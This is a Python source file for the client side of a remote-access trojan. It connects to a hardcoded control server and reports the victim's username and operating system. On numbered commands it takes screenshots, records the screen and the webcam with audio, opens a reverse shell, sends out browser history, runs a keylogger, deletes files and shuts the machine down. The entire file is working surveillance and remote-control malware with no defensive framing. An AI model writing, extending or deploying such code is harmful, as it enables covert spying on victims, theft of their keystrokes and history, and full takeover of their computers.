import socket
import subprocess
import platform
from getpass import getuser
from screenshot import screenshot
from camera_record import record_video_with_audio
from reverse_shell import handle_reverse_shell
from screen_recording import record_screen
from web_history import extract_and_send_history
from keylogger import start_keylogger, stop_keylogger  # Import keylogger functions

def execute_script(script_name):
    """Execute the given script."""
    try:
        result = subprocess.run(['python', script_name], check=True, text=True, capture_output=True)
        print(f"Script output: {result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Script execution failed, error: {e.stderr}")
    except FileNotFoundError:
        print(f"File not found: {script_name}")

def client_program():
    get_os = platform.uname()[0]
    get_user = getuser()
    os_info = f"client_name : {get_user} <-> client_os : {get_os}"

    host = '192.168.0.112'
    port = 50001

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    client_socket.send(os_info.encode())

    while True:
        message = client_socket.recv(1024).decode()  # Receive server message
        if message == '1':
            num_screenshots = int(client_socket.recv(1024).decode())  # Receive number of screenshots
            screenshot(client_socket, num_screenshots)
        elif message == '2':
            duration = 10  # Recording duration
            record_screen(duration=duration, client_socket=client_socket)  # Record and send file
        elif message == '3':
            record_video_with_audio(client_socket, duration=10)  # Record 10 seconds of video and audio
        elif message == '4':
            handle_reverse_shell(client_socket)  # Handle reverse shell
        elif message == '5':
            extract_and_send_history(client_socket)  # Extract and send web history
        elif message == '6':
            start_keylogger()  # 啟動鍵盤記錄
        elif message == '7':
            stop_keylogger(client_socket)  # 停止鍵盤記錄
        elif message == '8':
            execute_script('file_delete.py')
        elif message == '9':
            execute_script('close.py')  # Execute shutdown script
        elif message == '0':
            break

    client_socket.close()

if __name__ == '__main__':
    client_program()
